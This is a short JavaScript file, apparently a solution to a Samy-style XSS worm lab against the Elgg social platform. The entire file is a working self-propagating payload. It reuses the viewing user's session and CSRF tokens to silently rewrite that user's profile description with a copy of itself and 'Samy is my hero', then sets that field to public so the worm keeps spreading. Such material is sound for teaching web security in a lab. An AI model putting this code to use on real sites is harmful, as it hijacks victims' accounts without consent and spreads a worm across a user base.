"use strict";

/**
 * @param {number} guid
 * @returns {Promise<void>}
 * */
const editProfileWithWorm = async (guid) => {
  const baseUrl = document.location.origin;
  const path = "/action/profile/edit";
  const url = new URL(path, baseUrl);

  const worm = getWormCode();

  const params = {
    name: elgg.session.user.name,
    guid,
    description: `Samy is my hero ${worm}`,
    "accesslevel[description]": 2,
    __elgg_ts: elgg.security.token.__elgg_ts,
    __elgg_token: elgg.security.token.__elgg_token,
  };

  Object.entries(params).forEach(([key, value]) => {
    url.searchParams.append(key, value);
  });

  try {
    const response = await fetch(url, {
      method: "GET",
      credentials: "include",
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  } catch (e) {
    console.error("Failed to edit profile:", e);
  }
};

/**
 * @returns {string}
 */
const getWormCode = () => {
  const jsCode = document.getElementById("worm")?.innerHTML;
  if (!jsCode) {
    return "";
  }

  const scriptTag = document.createElement("script");
  scriptTag.id = "worm";
  scriptTag.type = "text/javascript";
  scriptTag.innerHTML = jsCode;

  return scriptTag.outerHTML;
};

/**
 * @returns {boolean}
 */
const isVisitingSelfProfile = () =>
  elgg.session.user.guid === elgg.page_owner.owner_guid;

onload = () => {
  if (isVisitingSelfProfile()) {
    return;
  }

  editProfileWithWorm(elgg.session.user.guid);
};
